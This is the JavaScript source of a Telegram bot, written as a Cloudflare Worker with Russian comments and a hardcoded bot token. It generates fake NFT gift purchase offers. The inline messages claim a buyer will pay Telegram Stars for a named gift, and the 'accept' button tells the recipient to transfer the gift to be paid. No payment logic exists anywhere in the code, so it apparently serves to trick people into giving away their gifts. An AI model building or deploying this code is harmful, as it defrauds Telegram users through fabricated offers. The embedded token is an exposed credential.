const ADMIN_ID = 5151757168; // Ваш ID
const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew"; // Убедись, что тут полный токен!

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") {
      return new Response("OK", { status: 200 });
    }

    try {
      const update = await request.json();

      // --- ОБРАБОТКА КОМАНДЫ /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;

        // Временно пускаем всех
        let text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n⏳ <b>Доступ:</b> ∞ бессрочно\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/ViceCream-355398 300 stars</code>`;

        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- ОБРАБОТКА INLINE-ЗАПРОСОВ (@GarisOfferBot) ---
      if (update.inline_query) {
        const iq = update.inline_query;
        
        const parts = iq.query.split(" ");
        if (parts.length >= 3) {
          const giftId = parts[0];
          const amount = parts[1];
          const currency = parts[2];

          const text = `🎁 <b>${giftId}</b>\n\n👤 <b>GiftBuyer Redo</b> предлагает вам ${amount} ⭐ Stars за подарок ${giftId}.\n\nОффер действителен ещё 5 ч. 59 мин..`;

          const results = [{
            type: "article",
            id: "1",
            title: `Оффер: ${giftId}`,
            description: `За ${amount} ${currency}`,
            input_message_content: { message_text: text, parse_mode: "HTML" },
            reply_markup: {
              inline_keyboard: [
                [{ text: "✅ Принять", callback_data: "accept_offer" }],
                [{ text: "❌ Отклонить", callback_data: "decline_offer" }]
              ]
            }
          }];

          await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
        }
      }

      // --- ОБРАБОТКА НАЖАТИЙ НА КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const data = cq.data;
        const chatId = cq.message.chat.id;
        const messageId = cq.message.message_id;

        if (data === "accept_offer") {
          const newText = "✓ <b>MarketRedo Скуп НФТ принял оффер!</b>\n\nПодарок продан!\nПередайте подарок для зачисления 300 ⭐ Stars";
          const newMarkup = { inline_keyboard: [[{ text: "🔄 Передать подарок", callback_data: "transfer_gift" }]] };
          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
        } 
        else if (data === "decline_offer") {
          const newText = "× <b>MarketRedo Скуп НФТ отклонил оффер</b>";
          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] } });
          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
        } 
        else if (data === "transfer_gift") {
          const alertText = "Инструкция по передаче:\n1. Откройте профиль Telegram → «Подарки»\n2. Выберите подарок → «Передать»\n3. Укажите покупателя и отправьте\n\n⚡ Средства будут зачислены сразу после передачи!";
          await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: alertText, show_alert: true });
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      // Если что-то упадет, мы увидим ошибку в логах
      console.error("ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
  return response.json();
}